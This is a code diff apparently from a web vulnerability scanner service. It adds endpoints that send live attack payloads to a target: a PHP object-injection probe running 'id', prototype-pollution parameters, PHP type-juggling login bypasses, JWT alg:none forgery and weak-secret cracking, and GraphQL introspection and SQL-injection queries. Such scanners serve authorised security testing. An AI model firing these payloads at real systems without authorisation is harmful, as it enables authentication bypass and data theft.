@@ -1282,17 +1282,259 @@ async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/deserial")
 async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
-    findings = []
-    r = _http_get(req.target, timeout=10)
+    import base64 as _b64
+    findings = []; vulnerable = False
+    base = _web_url(req.target).rstrip("/")
+    r = _http_get(base, timeout=10)
     if r:
-        ct = r.headers.get("Content-Type","")
-        if "java" in ct.lower() or "application/x-java-serialized-object" in ct.lower():
-            findings.append({"detail":"Java serialization content-type detected","severity":"HIGH","cvss":"8.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Avoid deserializing untrusted data. Use safe parsers."})
-        cookies = r.headers.get("Set-Cookie","")
-        if "serialize" in cookies.lower() or "base64" in cookies.lower() or "rO0" in cookies:
-            findings.append({"detail":"Possible serialized object in cookie","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-502","cwe_name":"Deserialization","owasp":"A08:2021","remediation":"Sign and validate all serialized session data."})
+        body = r.text; all_cookies = " ".join(r.headers.get("Set-Cookie","").split())
+        ct = r.headers.get("Content-Type","").lower()
+        # Java: magic bytes aced0005 appear as rO0A in base64 in cookies/body
+        if "rO0AB" in body or "rO0AB" in all_cookies:
+            vulnerable = True
+            findings.append({"detail":"Java serialized object detected (base64 magic rO0AB = 0xACED0005) in response — likely passed to ObjectInputStream","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Insecure Deserialization","owasp":"A08:2021","remediation":"Never deserialize untrusted data. Use allowlists. Upgrade to safer formats (JSON/Protobuf)."})
+        if "application/x-java-serialized-object" in ct:
+            vulnerable = True
+            findings.append({"detail":"Server returns Java serialized object Content-Type — endpoint accepts/returns Java objects directly","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Insecure Deserialization","owasp":"A08:2021","remediation":"Replace Java serialization with JSON. Apply SerialKiller or notSerializable checks."})
+        # PHP: O:N: pattern in cookies or body (PHP serialized object)
+        if re.search(r'O:\d+:"[A-Za-z]', body) or re.search(r'O:\d+:"[A-Za-z]', all_cookies):
+            vulnerable = True
+            findings.append({"detail":"PHP serialized object pattern O:N:\"ClassName\" detected — server may pass this to unserialize()","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"PHP Object Injection","owasp":"A08:2021","remediation":"Never call unserialize() on user-controlled data. Use json_decode() instead."})
+        # .NET: ViewState without MAC validation
+        vs_match = re.search(r'__VIEWSTATE[^>]*value="([^"]{20,})"', body)
+        if vs_match:
+            vs = vs_match.group(1)
+            if not re.search(r'__VIEWSTATEGENERATOR', body) or "EnableViewStateMac" in body:
+                findings.append({"detail":"ASP.NET ViewState found — if MAC validation is disabled this allows deserialization RCE","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-502","cwe_name":".NET ViewState Deserialization","owasp":"A08:2021","remediation":"Enable viewStateEncryptionMode=Always and machineKey validation. Use .NET 4.5.2+ with EnableViewStateMac=true."})
+        # Node.js: node-serialize / serialize-javascript patterns
+        if re.search(r'_\$\$ND_FUNC\$\$_|{"rce":', body):
+            vulnerable = True
+            findings.append({"detail":"Node.js deserialization payload marker detected — possible node-serialize RCE vector","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-502","cwe_name":"Node.js Deserialization RCE","owasp":"A08:2021","remediation":"Replace node-serialize with JSON.parse(). Never eval() deserialized function strings."})
+        # Send PHP unserialize probe as POST body
+        php_probe = 'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}'
+        try:
+            rp = _req_lib.post(base, data={"data": php_probe}, timeout=8, verify=False, headers=_BROWSER_HEADERS)
+            if rp and ("uid=" in rp.text or "root" in rp.text):
+                vulnerable = True
+                findings.append({"detail":"PHP unserialize RCE confirmed — POST data with serialized object triggered command execution","severity":"CRITICAL","cvss":"10.0","cve":"N/A","cwe":"CWE-502","cwe_name":"PHP Object Injection RCE","owasp":"A08:2021","remediation":"Remove unserialize() from all user-controlled input paths immediately."})
+        except: pass
     scan_id = str(uuid.uuid4()); save_scan(scan_id,"deserial",req.target,{"output":str(findings)})
-    return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+    return {"scan_id":scan_id,"target":req.target,"tool":"deserial","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+@app.post("/api/scan/protopollution")
+async def scan_protopollution(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    base = _web_url(req.target).rstrip("/")
+    marker = f"pptest{uuid.uuid4().hex[:6]}"
+    # Test 1: GET params with prototype pollution payloads
+    proto_params = [
+        f"__proto__[{marker}]={marker}",
+        f"constructor[prototype][{marker}]={marker}",
+        f"__proto__.{marker}={marker}",
+    ]
+    for param in proto_params:
+        try:
+            r = _req_lib.get(f"{base}?{param}", timeout=8, verify=False, headers=_BROWSER_HEADERS)
+            if r and marker in r.text:
+                vulnerable = True
+                findings.append({"detail":f"Prototype Pollution via GET: ?{param[:60]} — marker '{marker}' reflected in response, server may merge params into object prototype","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A03:2021","remediation":"Use Object.create(null) for config objects. Sanitize keys — block __proto__, constructor, prototype. Use frozen objects."})
+                break
+        except: pass
+    # Test 2: JSON POST body with prototype pollution
+    if not vulnerable:
+        pp_payloads = [
+            {"__proto__": {marker: marker}},
+            {"constructor": {"prototype": {marker: marker}}},
+        ]
+        for payload in pp_payloads:
+            try:
+                r = _req_lib.post(base, json=payload, timeout=8, verify=False,
+                                  headers={**_BROWSER_HEADERS, "Content-Type": "application/json"})
+                if r and marker in r.text:
+                    vulnerable = True
+                    findings.append({"detail":f"Prototype Pollution via JSON POST — {list(payload.keys())[0]} key reflected/processed, possible prototype chain corruption","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A03:2021","remediation":"Validate and sanitize all JSON keys. Use schema validation (Joi/Ajv). Block __proto__ and constructor keys."})
+                    break
+            except: pass
+    # Test 3: Check if app uses vulnerable merge libraries (client-side indicators)
+    r0 = _http_get(base, timeout=8)
+    if r0:
+        vuln_libs = [("lodash", "CVE-2019-10744"), ("jquery", "CVE-2019-11358"), ("merge", "prototype pollution")]
+        for lib, cve in vuln_libs:
+            if lib in r0.text.lower() and not vulnerable:
+                findings.append({"detail":f"JavaScript library '{lib}' detected — known prototype pollution vector ({cve}). Verify version is patched.","severity":"MEDIUM","cvss":"6.5","cve":cve,"cwe":"CWE-1321","cwe_name":"Prototype Pollution","owasp":"A06:2021","remediation":f"Update {lib} to latest patched version. Apply Content-Security-Policy."})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"protopollution",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"protopollution","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+@app.post("/api/scan/typejuggling")
+async def scan_typejuggling(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    base = _web_url(req.target).rstrip("/")
+    # PHP magic hashes — these strings == 0 in loose comparison (==) with 0 or other magic hashes
+    magic_hashes = ["240610708","QNKCDZO","0e215022452","aabg74hk2","0e830400451993494058024219903391"]
+    login_paths = ["/login","/login.php","/admin/login","/wp-login.php","/index.php","/signin"]
+    for path in login_paths:
+        url = base + path
+        r0 = _http_get(url, timeout=6)
+        if not r0 or r0.status_code not in (200, 302): continue
+        # Test 1: JSON type confusion — send boolean true as password
+        for uname in ["admin","administrator","user"]:
+            try:
+                rj = _req_lib.post(url, json={"username": uname, "password": True},
+                                   timeout=8, verify=False,
+                                   headers={**_BROWSER_HEADERS, "Content-Type":"application/json"})
+                if rj and rj.status_code in (200,302) and any(x in rj.text.lower() for x in ["dashboard","welcome","logout","profile"]):
+                    vulnerable = True
+                    findings.append({"detail":f"PHP Type Juggling: POST {path} with password=true (boolean) bypassed authentication for user '{uname}' — server uses loose comparison","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Type Juggling","owasp":"A07:2021","remediation":"Use strict comparison (===) everywhere. Use password_verify(). Never compare passwords with == or in_array with loose types."})
+                    break
+            except: pass
+        if vulnerable: break
+        # Test 2: magic hash string as password
+        for magic in magic_hashes[:3]:
+            try:
+                rm = _req_lib.post(url, data={"username":"admin","password":magic},
+                                   timeout=8, verify=False, headers=_BROWSER_HEADERS)
+                if rm and rm.status_code in (200,302) and any(x in rm.text.lower() for x in ["dashboard","welcome","logout","profile"]):
+                    vulnerable = True
+                    findings.append({"detail":f"PHP Type Juggling: magic hash '{magic}' accepted as password at {path} — server compares hashes with == (0e... == 0e...)","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Magic Hash Type Juggling","owasp":"A07:2021","remediation":"Use === for hash comparison. Use password_hash() and password_verify(). Never use md5/sha1 for passwords."})
+                    break
+            except: pass
+        if vulnerable: break
+        # Test 3: array bypass — password[]=anything
+        try:
+            ra = _req_lib.post(url, data={"username":"admin","password[]":"x"},
+                               timeout=8, verify=False, headers=_BROWSER_HEADERS)
+            if ra and ra.status_code in (200,302) and any(x in ra.text.lower() for x in ["dashboard","welcome","logout"]):
+                vulnerable = True
+                findings.append({"detail":f"PHP Type Juggling: array bypass at {path} — sending password[] as array bypassed string comparison","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-843","cwe_name":"PHP Array Type Confusion","owasp":"A07:2021","remediation":"Validate that password input is a string, not an array. Use is_string() check before comparison."})
+        except: pass
+        if vulnerable: break
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"typejuggling",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"typejuggling","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+@app.post("/api/scan/jwt")
+async def scan_jwt(req: ScanRequest, user=Depends(verify_token)):
+    import base64 as _b64, hmac as _hmac, hashlib as _hashlib, json as _json
+    findings = []; vulnerable = False
+    base = _web_url(req.target).rstrip("/")
+    # Step 1: find JWT tokens in response headers / cookies / body
+    r = _http_get(base, timeout=10)
+    jwt_tokens = []
+    if r:
+        # Look in Authorization header hints, cookies, and body
+        combined = r.text + " " + str(r.headers) + " " + r.headers.get("Set-Cookie","")
+        jwt_pattern = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', combined)
+        jwt_tokens = list(set(jwt_pattern))
+    # Also try login to get a token
+    for lpath in ["/api/login","/login","/api/auth/login","/api/auth","/api/token"]:
+        try:
+            lr = _req_lib.post(base+lpath, json={"username":"test","password":"test"},
+                               timeout=6, verify=False,
+                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
+            if lr:
+                found = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', lr.text)
+                jwt_tokens.extend(found)
+        except: pass
+    jwt_tokens = list(set(jwt_tokens))[:3]
+    def _b64pad(s):
+        return s + "=" * (-len(s) % 4)
+    for token in jwt_tokens:
+        parts = token.split(".")
+        if len(parts) != 3: continue
+        try:
+            header = _json.loads(_b64.b64decode(_b64pad(parts[0])).decode())
+            payload_data = _json.loads(_b64.b64decode(_b64pad(parts[1])).decode())
+            alg = header.get("alg","")
+            # Check 1: alg:none attack
+            none_header = _b64.urlsafe_b64encode(_json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
+            none_token = f"{none_header}.{parts[1]}."
+            try:
+                rn = _http_get(base, timeout=8)
+                # Send none token as Authorization Bearer
+                rn2 = _req_lib.get(base+"/api/profile", timeout=8, verify=False,
+                                   headers={**_BROWSER_HEADERS,"Authorization":f"Bearer {none_token}"})
+                if rn2 and rn2.status_code == 200 and len(rn2.text) > 50:
+                    vulnerable = True
+                    findings.append({"detail":f"JWT alg:none attack successful — server accepted unsigned token without signature verification","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-347","cwe_name":"JWT Algorithm Confusion","owasp":"A02:2021","remediation":"Explicitly validate JWT algorithm. Reject alg:none. Use asymmetric keys (RS256) instead of HS256."})
+            except: pass
+            # Check 2: weak secret brute force
+            weak_secrets = ["secret","password","123456","admin","key","jwt","token","supersecret",
+                           "your-256-bit-secret","change_this","mysecret","s3cr3t","pass"]
+            if alg.startswith("HS"):
+                msg = f"{parts[0]}.{parts[1]}".encode()
+                for secret in weak_secrets:
+                    expected_sig = _b64.urlsafe_b64encode(
+                        _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
+                    ).rstrip(b"=").decode()
+                    if expected_sig == parts[2]:
+                        vulnerable = True
+                        findings.append({"detail":f"JWT signed with weak secret '{secret}' — attacker can forge any token (admin, role escalation)","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-347","cwe_name":"Weak JWT Secret","owasp":"A02:2021","remediation":"Use cryptographically random 256-bit secret. Rotate secrets regularly. Consider RS256 asymmetric signing."})
+                        break
+            # Check 3: sensitive data in payload
+            sensitive_keys = ["password","passwd","secret","credit","ssn","dob","email","phone"]
+            for k in sensitive_keys:
+                if k in str(payload_data).lower():
+                    findings.append({"detail":f"Sensitive data in JWT payload: key '{k}' found — JWT is base64, NOT encrypted, visible to anyone","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-312","cwe_name":"Sensitive Data in JWT","owasp":"A02:2021","remediation":"Never store sensitive data in JWT payload. Use opaque session tokens for sensitive data. Use JWE for encryption."})
+            # Check 4: no expiry
+            if "exp" not in payload_data:
+                findings.append({"detail":"JWT has no expiry (exp claim missing) — token is valid forever, cannot be invalidated","severity":"MEDIUM","cvss":"6.5","cve":"N/A","cwe":"CWE-613","cwe_name":"Insufficient Session Expiration","owasp":"A07:2021","remediation":"Always set exp claim. Use short-lived tokens (15 min). Implement token refresh flow."})
+        except: pass
+    if not jwt_tokens:
+        findings.append({"detail":"No JWT tokens detected in responses — site may not use JWT authentication","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"N/A","owasp":"N/A","remediation":"N/A"})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"jwt",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"jwt","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+@app.post("/api/scan/graphql")
+async def scan_graphql(req: ScanRequest, user=Depends(verify_token)):
+    findings = []; vulnerable = False
+    base = _web_url(req.target).rstrip("/")
+    gql_paths = ["/graphql","/api/graphql","/graphiql","/playground","/gql","/query",
+                 "/api/query","/v1/graphql","/v2/graphql","/graphql/v1"]
+    introspection_query = '{"query":"{__schema{types{name fields{name}}}}"}'
+    found_endpoint = None
+    for path in gql_paths:
+        try:
+            r = _req_lib.post(base+path, data=introspection_query, timeout=8, verify=False,
+                              headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
+            if r and r.status_code == 200 and "__schema" in r.text:
+                found_endpoint = path
+                vulnerable = True
+                # Extract type names from introspection
+                type_names = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]+)"', r.text)
+                sensitive_types = [t for t in type_names if any(x in t.lower() for x in ["user","admin","password","secret","token","auth","credit","payment"])]
+                findings.append({"detail":f"GraphQL introspection enabled at {path} — full schema exposed ({len(type_names)} types). Sensitive types: {sensitive_types[:5] or 'none detected'}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"GraphQL Introspection Enabled","owasp":"A05:2021","remediation":"Disable introspection in production. Use query depth limiting and complexity analysis."})
+                break
+            elif r and r.status_code == 200 and "data" in r.text:
+                found_endpoint = path
+                findings.append({"detail":f"GraphQL endpoint found at {path} (introspection blocked but endpoint active)","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-200","cwe_name":"GraphQL Endpoint Exposed","owasp":"A05:2021","remediation":"Implement authentication on GraphQL endpoint. Use persisted queries only."})
+                break
+        except: pass
+    if found_endpoint:
+        # Test for SQL/NoSQL injection via GraphQL
+        inject_query = '{"query":"{ user(id: \\"1 OR 1=1\\") { id name email } }"}'
+        try:
+            ri = _req_lib.post(base+found_endpoint, data=inject_query, timeout=8, verify=False,
+                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
+            if ri and ri.status_code == 200:
+                if re.search(r'"email"\s*:\s*"[^@]+@[^"]+"|"password"', ri.text):
+                    vulnerable = True
+                    findings.append({"detail":"GraphQL injection: SQL/NoSQL injection via GraphQL argument returned user data — possible data exfiltration","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-89","cwe_name":"GraphQL Injection","owasp":"A03:2021","remediation":"Use parameterized resolvers. Validate and sanitize all GraphQL arguments. Use ORM with prepared statements."})
+        except: pass
+        # Test for batching attack (DoS / auth bypass via alias batching)
+        batch_query = '{"query":"{ a:__typename b:__typename c:__typename d:__typename e:__typename }"}'
+        try:
+            rb = _req_lib.post(base+found_endpoint, data=batch_query, timeout=8, verify=False,
+                               headers={**_BROWSER_HEADERS,"Content-Type":"application/json"})
+            if rb and '"a"' in rb.text and '"b"' in rb.text:
+                findings.append({"detail":"GraphQL query batching allowed — attacker can bypass rate limiting by batching auth attempts in a single request","severity":"MEDIUM","cvss":"6.5","cve":"N/A","cwe":"CWE-307","cwe_name":"GraphQL Batching Attack","owasp":"A04:2021","remediation":"Limit query complexity and depth. Implement per-query rate limiting. Disable batching or limit batch size to 1."})
+        except: pass
+    else:
+        findings.append({"detail":"No GraphQL endpoint detected at common paths — site may not use GraphQL","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"N/A","owasp":"N/A","remediation":"N/A"})
+    scan_id = str(uuid.uuid4()); save_scan(scan_id,"graphql",req.target,{"output":str(findings)})
+    return {"scan_id":scan_id,"target":req.target,"tool":"graphql","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}
 
 @app.post("/api/scan/smuggling")
 async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
